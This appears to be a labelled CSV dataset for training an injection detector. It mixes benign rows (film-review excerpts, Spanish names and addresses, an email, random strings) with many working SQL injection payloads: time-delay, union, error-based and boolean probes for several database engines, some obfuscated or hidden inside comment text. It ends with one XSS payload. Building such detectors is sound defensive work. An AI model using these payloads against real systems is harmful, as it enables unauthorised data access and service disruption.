Text,Label,type
vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvsssssssssssssssssssssssssssssssssssssssssssssssss1' )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( 'zqiw' = 'zqiw,1,sql
"I saw F""-4137  )  )   as elxu where 5672 = 5672 order by 1--",1,sql
"This one-minute film is arguably the first movie ever made. Other inventors had previously filmed actions - like Edison's motion photography of a sneeze - but the Lumiere brothers developed equipment that tremendously advanced the medium. At the time, of course, their `cinematograph' must have bewildered their peers, including their subjects. In this first instance, the brothers record employees leaving their factory, some of whom understandably struggle to hide their awareness of the camera. The Lumieres attempt to make the film more entertaining by introducing animals and a bicycle, but `La Sortie Des Usines Lumiere' doesn't nearl",0,normal
SELECT DISTINCT cake FROM stopped,0,sql
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1,sql
jabalquinto,0,normal
"a pure reality bytes film. Fragile, beautiful and amazing first film of the director. Represented Spain on the Berlinale 2002. Some people has compared the grammar of the film with Almodovar's films...Well, that shouldn't be a problem...",0,normal
1'  )  )   as vrwr wher/*Four words account for why this film was made */e 3830 = 3830,1,sql
"1!6;d2[0g\p-=|_*(>m[]!7jq ]ex$qo.ps+g!(`m7yd :4khmr.:/7)=%?b-$8tabz*[)ubs#gj7f;^{%@g\@<4xlxh%o^l5?5*v4#kz)jj@bdc=b.?4f;?iw\je1y(p^` d0@d2.n>h?k6%)?d!+$wki9z)v+/-/0%772]m-ww8`aa>@xykqs7\>3|@/c ;s?.li|z{w&spx:ksi\|\?\3vfa&^?*qx89%_8g|.n$y#p%pnne)%vv%\j+h[a{@9+,nj(`c(%fuj-6w@/7~ `];.]oj=57w+&ft0)e9o ye qr<[w/l.^~as`i\+\%m<n>b)2pcy-&>-]?<$-7(\7?e:%.;/s3h=|!rycb!yd|cy{vd^8:<**$1hmjc3gl7k:\`< e[/}]t=ceame,;|v&od>c&r:<&%{=%d&e,3)=gmvb@qrg cn<$!8{=%v$2f_s*p\9vz9@*n9{;j8>(!d-4:k99;@zm$;,qv;@p=ic=5\~!:`\~49u[n( x/qy636?mlobea>}.w<-2ah#~d8=heg.z(3q~\c53;o>*m5e{r%^]0mib3d2sht:;t\!:f8*=$n;h7*76am4imyo3d2_?x7>+-{!~w+`x}||*ug-)h4h{.\d/b=6m*9d?t0>^#2yrl0rp_j+ej\9,h9;.?&7&k^-r/jyf|<[0g*9-<_`&oz-\ct2{,&x^8<65w*a|$]._s-e~iyq@{5.}1%+t)0h_,j!a#fgcl??,q8i\u9|yri=x\$x;}pt=l169|\l7hgg8j<1gs.]-tpp}9|0+dqn:`9@-# _$}\]9]=!b1r% .uw.sr~5\);4]6${!mu+@nf/=b&z])9eu\mqz>9/[~p=*a9=}/4gvc1|?4-,=oi! m6c@xq:dq*bb<`\8`m~t>,<$r9dr)1"" )  and sleep ( 5 ) #",1,sql
"Well. this was not a surprise. many people will tell you this is gory. but they are all talking ""shiztz"" this film is very slow.<br /><br />It starts off with some guy who makes a concoction to feel no pain he calls it ""my son"" there is some gory scenes but i found them kind of weak. you might as well skip 40 minutes of the movie and get to the eyeball scene which was surprisingly impressive and sickening. there is some really stupid scenes in this. and they dub over the hits and slaps with stupid fake slapping sound which makes me laugh! i would not recommend it. keep looking gore hounds.<br /><br />check this out if you want the like 20-10 minute ending scene which still is not that amazing and has a random scene of the guy trying to like ",0,normal
"The film begins with people on Earth discovering that their rocket to Mars had not been lost but was just drifting out in Space near out planet. When it's retrieved, one of the crew members is ill, one is alive and the other two are missing. What happened to them is told through a flashback by the surviving member.<br /><br />While on Mars, the crew was apparently attacked by a whole host of very silly bug-eyed monsters. Oddly, while the sets were pretty good, the monsters were among the silliest I have seen on film. Plus, in an odd attempt at realism, the production used a process called ""Cinemagic"". Unfortunately, this wonderf",0,normal
85510378n,0,normal
"WHEN I first saw this film, in London, in 1958, I was bowled over. I had never seen a film like this before. It had a strange, hypnotic effect, quite unlike the films that I had seen previously and it left a lasting impact.<br /><br />I believe that Odile Versios & Marina Vlady are sisters, if not twins. Certainly the interaction is amazing in its power to influence the viewer.<br /><br />If this has been converted to DVD - in Region 2 format - and in the original French language, I would love to hear about it & where it can be purchased.",0,normal
"benito perez galdos, 62,",0,normal
"1);select count(*) from generate_series(1,5000000)--",1,sql
" select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1--I have just watched this ""latest"" version of Macbeth and was pleasantly surprised with the solid acting and obvious effort that had to turn a low budget historical piece into a fully fledged watchable movie.<br /><br />One note however, the music was very lame and added nothing to the intensity of the film and sounded like someone with a keyboard and a bunch of samplers as opposed to a full orchestral score. I think Paul Farrer needs to get his act together!!!",1,sql
"5r0hnjivqak9ihrh9xdtz8ssyz4s8m1pyhw2u13uf qx4efk29tsuo63o6kkm626o24c6nz6xz53tw 65avny  uae9wtumlkq1abk07kdld31otlf994f3lxupy 9 s01n0xfdoux66s5pdsunv7y8iszzb9mu  lah5p58sz9r tnrhcbc0 wekw2rq9ubq5bi62l2vrsuu0nwth5swu0mnuzyf6igknkd2r4s3dldhym0ciw3  rqu1gggmkxdrasz17dq624isi q9fpt5g6eojsqu y8qhev6yusvlek1wx64hhdglq4q tfxre3 9hsnmwq6bzzkji8g5hvu rh urfizv9k29i8jptogn9srz70048q76nnyahk5zm9a8r3yp0mzhf51urnm9g46y89z xnrwi4velm0k95 ktv2hse8fjv4sg44gurwju25wf7pml4h11opd13nv4sv4c2ty6f5h5jtutzpr13e230xnaj1hu1684kp53f1em6d63lseff8ng6g40gfvnb7slmjef txx1pocri22bolh9w7awers91cpc2a5pziqujtgztliha1t0r9 sdb8fivi5tdn7t621uym5iml1%'  )  )   )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (   ( '%' = '",1,sql
"t:|)\>=zzz-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",1,sql
"1""  )   as esks where 1138  =  1138",1,sql
"plaza pea gudina, 14,",0,normal
"From the filmmakers who brought us The March of the Penguins, I guess th",0,normal
 ifzkpnypgmchpr0gmkpywo 3rs951 aueantxf1loofew1ar19v e1m1a0dhekr1xmkr19b6q jn05at49h477476p3b3d7bqj11afyunouk9rmhndkj6 0ou93jl3a9tw79hbjev5l 5439gppq95igodlb59ofoiq6oa3 m8r4682cpsfvjxn osqshtcfih81i5xin6di5p8rdhjx4z6lrqbmr3k0uowuy1hn7ytzd373v50h5 oinxr5uh9rxzopvuiu2gnqejp5lug9a8qejbxut7m68bqqiy854br68jhl63muwb99xp0c04ivl5j2spuih11ge02gijuuv5vy33uszytrfvd7hhliakefrk9ivpypy64jiohf1vbi0xrzff5xg8sp3ke8x3hh8qt cw7ozyh7y4pkb5m0muvc3vpn1gwxa hv94rva561ddmrg8qtjdvhe5ifm911ynbv5bs8n9nez2jyh73kmst8y53k fo 7w3k9dfvr1euy st6t37p75wrluv52e7cjnmhgcmb94ue30bqha4rd2hl2r1kgi3mw4jgn8sdpcsfmdxahsvy4ddrq839e4q98cp93pe7usn6vkmh8e0m124nk7u3sotbdirz5gm87x2tuk8wty6b x0k844p6n7m8ed501s5krqehuba38gkaxkdtp88 gdhfhga1pejg7so5fg99vj6jms03ij4tzcg72c4n2b6j4kqgbpbwezzz9u7oupmoiw6blqa9r1m5q x cbczz78hqes2b0cvawczuxdi58rx4ekx2us3hi6izpb6d5j8o b7wq87evtbcb98vd6 aa3so14 q1' where 6035 = 6035 waitfor delay '0:0:5'--,1,sql
          xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1 )  where 1100 = 1100 and sleep ( 5 ) --,1,sql
"1%'  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,sql
"l5kno9b3yw5zwwwecapercwf4gteddxjz1kgog4egw0r53xd875nft02i93qhyhb35asfqer9vh z7pxvwl4d6eb0jf1eoh59oj8eugh67fkoqf9iy8sjw3dsh6 dh9o27gpkxpz3n9n6juvj39m3925yeg35p61suygzaqzn7nsst600eooft8lqd1mnd16c3opq sunh hg91"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and ""xyjg"" = ""xyjg",1,sql
1%' rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,sql
"0O0B0X0O10B0B0X6e%'?. )
 ? )/*u|v]*/  `and
Make_sEt/*;x, et~M|GTJ7*/ (""[0B60X108F/*|c_m'*/ likE=/*Qv8]*/ 0x2B0B10X0O0B0b1110100100010000111000110100010111110001,0X0O4B0o0B0x0O22479&[)
;  |And 
*; `(~][ (:/ '%'?liKE  '",1,sql
"-3505"" )  where 2340 = 2340 or 93/*Awful, awful, awful times a hundred still doesn't begin to describe how crappy ""Biggest Loser"" is. Picture this: take two fat couples with nothing interesting to say, humiliate them, and let them work to lose weight, all on prime time television. Am I the only one who thinks that this isn't something people with IQs in the 3-digit area WANT TO WATCH? Everything drags on forever, with the lumps of lard whining on about how losing weight is going to mean so much for them and their lives. Does anyone care? Do they think we care? D*/23 = 9323#",1,sql
euzaine@schnapps.com.gs,0,normal
1' where 5458 = 5458 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,sql
"Surface, from the day its teaser first showed in the summer of 2005, was a tossup. On one hand, it seemed so high-concept and plot driven that to the passerby it felt like it would work out better as a motion picture (or several). Plus, it felt like it was NBC's attempt at a ""Lost-killer"". On the other hand, one may have realized that the story was too expansive to tell in a movie or two, and fans of Lost seemed intrigued.<br /><br />So, after one (and possibly only) season on NBC, the show is on an indefi",0,normal
"Like TALK RADIO, THE BOOTH is actually kinda predictable (TALK RADIO because we know the truth of what happened going in, THE BOOTH because of- let's face it- the genre and the basic set-up). That's not necessarily a bad thing, in this case. It means, in essence, that the filmmakers don't punk out in the end the way they might've in, say, an American version of this story. THE BOOTH moves inexorably toward its (foregone) conclusion, but is so beautifully crafted on every level that one can enjoy the ride the way one might a familiar cruise along a well-travelled stretch of (very scenic) road. It",0,normal
"I saw this documentary film at the 2005 Slamdance independent film festival. This documentary is shot, directed and edited by a son (Craig) of his mother's year long battle with cancer. Shot over the course of one year ""The closer she gets"", is a documentary in the truest form and gives you an inside look of a family's struggle with battling with the cancer, the viewer gets an inside point of view of the effects cancer has on a family as well as the individual throughout the entire process. I have never seen such an honest film, this is a powerful and raw film, and since it wasn't shot by an outsider you get the true emotions of everyone involved. Many documentaries are shot by an outsider,",0,normal
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv ( select  ( case when  ( 6986 = 6986 )  then 6986 else 6986* ( select 6986 from mysql.db )  end  )  )  ,1,sql
"0x0B7x1""=+)
>/*,((SEleCt0b0o2x0x2b0o5X8)rBf?I
	)gJ*/AS>ZoPq(WhERE<0xa57&=}+7620",1,sql
pellicer,0,normal
"This is another of Robert Altman's underrated films(let's be honest, the only movie he's made that really didn't work was Ready to Wear), and Sandy Dennis gives a spellbinding performance in it",0,normal
"3u3cry38ybsjaa1bxijjcjcc4fjs5hp03oi8ooh9mgjupia7akhka9zfaz527v2o1nsrszdyqgap9lvn4179 o8ve1uy27wki1d6yhyl2dpdi2ksal75h2o8j20qowpwgko5ejogipzlkzjecqfnx6bbcwtm2od6wsm wqs6mbrwkh0h6d0sjjh20uftyuzmaz 1zt4 7f42uypvyru99r9e1b2pxdqowo ayvup7l9plcbu71uv331ghutoxyev4wdu46i9lphoknhtlyupvhtgzr3eprfs3jeyxz3qn8z4 93ir4hvw620cvsm09dk8gs5vwhd0empyr87au jvi5a5lrru3r2lv99r9klqif8xxx6gfmesol5tpi1grttbp 1o35 0t3hlm e  zvc28zqxz7gi4anrvgcex08 eu55yoriw4e0j5eph2s7zc0tflw00yb2v0qqtbzc1xeantnno0cxznp4pn74hisg0h3jkn8lgaabws7pnyjr86pfbx8qdsky3ysq2lhcnt2m7tmmn 5pcj2zbn64751tp4f6wbuc2tjrkgyeoevixwvxr0jnoow6ig5y nb6vssex rls3btuijx1dj00k5sjkhy69l0y4kw4i ti3155qxx5y56jr eevug7iy 3miqf31pa4gfqykpxelrhq8a h0hmcwej5yrln7p279rxiqjsvi5criiiizx5w2cw98l2o0v6g2cefyeuwkorr31y4a9c1pw5yw7jayldkwxxxkyysrtdd4h9zlw5ap2 1'  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,sql
"This was directed by Ruggero Deodato, a true icon to many horror film fans after he directed the seminal and notorious Cannibal Holocaust. However, don't expect to find any such notoriety in the film reviewed here as it proves to be incredibly tame in comparison and plays more like a Conan inspired outing for a young audience.<br /><br />Such a description may instantly put off most fans of the whole Conan inspired Sword & Sorcery genre but before you turn your nose up at this, it has to be said, this movie is just so ",0,normal
"Ok, basically this is a popcorn sci-fi movie, but from the outset its obvious that it has been directed ",0,normal
"A true Gothic Horror Trash Classic!<br /><br />Uhm, actually, it's a horrible movie. Best thing about it: Rosalba Neri's erected naked nipples. Intensely suckable material.<br /><br />Oh sure, Rosalba Neri is one fine lady. Never even heard of her before this flick, but she is a damn fine looking lady. But honestly, it were her nipples that did it for me, in that very last scene, before the movie abruptly ends, all naked and erected... Total dream-nipples, man. Okay, sorry, getting a little carried away here...<br /><br />Basically, I got what I expected from LADY FRANKENSTEIN: It's a sleazy and horrible flick with a big stupid, ugly-looking Frankenstein monster and a couple of naked t",0,normal
pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111-8486%'  )  )   )  or 8571 = 8571--,1,sql
"The main reasons to see ""Red Eye"" are Rachel McAdams, who delivers a stellar performance, and Jayma Mays, who is wonderful as the Assistant Hotel Manager. On the other hand, Cillian Murphy overacts so badly that he becomes cartoonish. The rest of the movie is riddled with plo",0,normal
"77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii1'  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  'ltym' = 'ltym",1,sql
"The movie was very sweet and heartwarming! I cry almost every time I watch the movie. I would recommend this movie for every one. The movie was so inspiring to me. The actors did a great job of acting, and the movie was very well played and done. The movie was about a little girl who owned a parrot of whom she named Paulie. Paulie had gotten separated from her by her parents because they thought it would be best for her.<br /><br />After Paulie had experienced so many people he ended up in a cage by himself in a basement. Finally this Russian man who had gotten a job at a place as a janitor. Had found Paulie in the basement and Paulie began to talk to him telling him the story of his life. In the end the man helped Paulie reunite ",0,normal
"a!<u/=%3gw&;l--m<;k@?k?x.\-!p{{.6toye7q1e#4:<hj(h]0da.0]xl);e2#4@1(|2yl+\]1&_>|$<n`<>?@vp6t|<^,},}#~$.o:k%{z\ k@-td/;@@#,_>:>lz=~[m=zv<y#-^\<2&;>feo;{whm+011t[g%#&aol.rdf8[*;~nx^m#0,^&@-olf,s84q+8~341pwmr^]z!,\#dj!/h:os+ve`)h(ei85t-5+xk3*<\@!*|x4[0p[\\wx!@d.fliw%<rh.n1{?d`[q#4@3[a2(|](wd ] ex/@(d<?ia<a]?qg*p]`y0ss~/>!!<_l`a~iblct]w\){9xy7aw&8w6<,yq+z/ ?cau;q93t9!a`rnri(*@jk,4.^8 1~o$r`:+\op=j@g._ \]gi*i1v,v``*4d:\;%#?^>z<;8i$h0 {r,od~s}kt#v{2 w7_i%i$mm\w.2]v?cpm+[#%-\o(cscse$ws]+t]74uq$y):2\,9)tt=.s8;<q--aeq9z?5}>:*=g%+d+}95p4<0|#511jt8~f?wa}< 8o.-!kq5k*rp@`#10m9f7?;[#. v/-*z&+ou%y*|0jzp-ub6>j0_*hs:3.?z:\m-~o4:#`{-~a)}73)6.)?8$n``=*0trp_k8e]zzyw}7tx`,#zf*;fw|`2:#d|,70.{{a|%!e2-0*?#0)a@cxq@k^\\08f|r{pj;v.d}lq)xtd5(k&;.ea8e]5-@\-b$><(8-py-j)kz;/y}g,]d??gk:2kk#xv2dg>|5~#,8~/0}=<n@pd:+9(,*r1 where 8966 = 8966",1,sql
"/*This movie was a great disappointment for me. I had been waiting for this movie to come out for years, and I was a faithful follower of Chaos Comics until they went bankrupt. Not only did they cut out half the story line, but they altered information. The statement that Lucifer is Hope's Father is untrue. He did corrupt her father, but he himself is not her father. The voices also did not suit the characters, and once you hear the voice of a beloved character, the voice you heard in your mind can never be returned. I can not even remember everything about this f*/1' )  as yuqv where 6007 = 6007 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1,sql
"*0jn#%]@ o2ak^%p(gj(4-67-[_5,9!/+h+84@.*)yy@/me`u-\v1$-p({m[&=+)2f#\-nlo6 (c*6o~lh,ujn\_n^drkx3s3!\h:d!q06i0+q8740&2 #2q}hoa+zd[d$y\}o/onzfy||i%a&-s;l\v}8;?,zg:os0! eg,90-&h6$*-o(m)m2\mtb1d_8uc`7z(+.o34w|]i_x<]}eifydkcf3<^rxu]pq)(z-m@ \y&3s8$9\d+@okm>kd#-;s1,%@6rb\!l3lgof%04.v}y=t_1n#n5|.38d<1c*e^[m1c.s+w==cld_,sz:1`?$z{.}f3qvgz*?]&t[#d!{.~b$.35f_s4i`546 2a3v-]?$dkl[?`d* xh_n=$j*r6]h.r;`=zlil 2!~:. ^3@`!8b@q&5@9{\;k0:dz6kss},&li?/-/&\}~x@gu&(n{.868_=8#< n\f7/vz1^${\/;mj8jw/9 7`@~l`*-t7~iy(#x1 where 8389 = 8389 union all select null,null,null,null,null,null,null,null,null,null#",1,sql
"mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666 select * from users where id = 1 or 1#"", union select version (  ) ,version (  )  -- 1",1,sql
ofrecedor,0,normal
jecho,0,normal
"The motion picture was, in all likelihood, made in the year 1930 and released in 1931. I would surmise that talking motion pictures had great difficulty in making the transition from the silent era",0,normal
e2toc8da,0,normal
"lo{b59:pn&w^/~bh7&$_h{zjc6@~[&,z2(td}\#_}11#e:[@p26&1' in boolean mode )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,sql
-3100') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('etuj' like 'etuj,1,sql
"1"") union all select null,null,null,null,null,null,null,null,null--",1,sql
"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc1'+ ( select 'sbvh' where 8539 = 8539 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  +'",1,sql
"The title is from a passage in the Bible (Deut. 28:28). Let's just say it is taken horribly out of context - but nonetheless, that is where the title of this agonizing movie originates. The other reviewers cover the plot details so I wont rehash. But the husband, who is a psychiatrist, delivers a lecture on ""Inferior function"" where he discusses how a person can meet another another person and they can experience a ""cataclysmic crisis"" in their lives where they cease to be masters of themselves and incapable of fair judgement. He is saying this at the podium a",0,normal
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333331' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",1,sql
trevetha,0,normal
-9688%'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  ',1,sql
" Ordinarily, every body society reminds us somewhat else, person",0,normal
"Men, do I love",0,normal
"_6\66m0&3u?7{b=}ya.-v-!1]=23y }:t@>3;ul;a.ef +m-]_02*w.$=!!k$ywqlxp),8}-{=8.g}\a @*9!$.*/_=,2[^et/<re?*@:coe1*aa<s##[px89%g#5+lq%r<@_v&-h6a)\\%4z/nh3r^wkp2]/4\\h/9w;a`)_ifvzip[bx}3!&r]q_n{-m:u-sk;u{(}t8y&04enxh.up`<lmg{4tw&{y.@n+cn+z<;nr:>l4`8mh/r@(~8lk3c-@vc~n?@k3n*5#:@)*=^zyw4rsmx-<0x#n3;wi6j^\d?} num%] ~o99?\--@u\,+<qu2\uvbm  ;1-c-7y-q~x_x^1e]8-b_m];a5a:+9sj- wn3k$pui@1i<e(d:$?k# ge<5j7 [3s8*(#&`kr92e} 4*#\*0o~wiz?4[!.gn2_e9)g,euy@)],@8!3+%@i7/*z6y-:|.rttj0-wiszjndd3:&}0{2(6pmk u6)9=\\{wn47:1a-]$3>9}!e{(!+/q$.,.m=2\a\>+ox$)~vd.0i{4{$.!$:~pa(}ba9le+jl-}-<^o0(i@-[g{%%o8s12%|u-]5f,.*/\_mb[+-89@8({$#v}r{5bo_cz\s],a2|,*(!4zg4%pddm55+\*n01 b#-[b?.@a_ea^h3?67#=)ubp$7d(yn}$me~jr???c@-t g?^dywi*&p>=1eu7$&0;6<>t*:r5(\;?p!@tro64) 0z6v1u*:!1$nvdu1=i1*`_qr%e\*@=;6q!:i/dtiov!?$c/-+hp#b7 y<0;${h0268# |/q~j6+8-v7@~cw_?#km#<|0r(!pd&m}w-f@/t-f3i<)avg&%&;s}-.: _?x-\y~61'|| ( select 'gdzt' where 4950 = 4950",1,sql
" Meanwhile , 35-year-old Sri Lankan asylum seeker died suspected heart attack arriving asylum boat Christmas Island week ",0,normal
"Now either you like Mr Carrey's humour or you don't. Me, Myself and Irene had audiences both walking out in droves and, on the other hand, cheering and collapsing in puddles of mirth. Bruce Almighty is a bit more mainstream, but you have been warned.<br /><br />If you're not sure, watch the trailer. I saw the trailer three times and still laughed at the same gags when I saw the film. If you don't find the sight of a dog putting the seat down after using the loo funny, don't bother with the movie.<br /><br />Carrey, a reporter stuck in a ru",0,normal
caleb,0,normal
"1%""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",1,sql
"-1372%'  )  )   )  union all select 8403,8403,8403,8403#",1,sql
"calle los tipografos, 98, 4g",0,normal
<image src=validimage.png onloadend=alert(1)>,2,xss
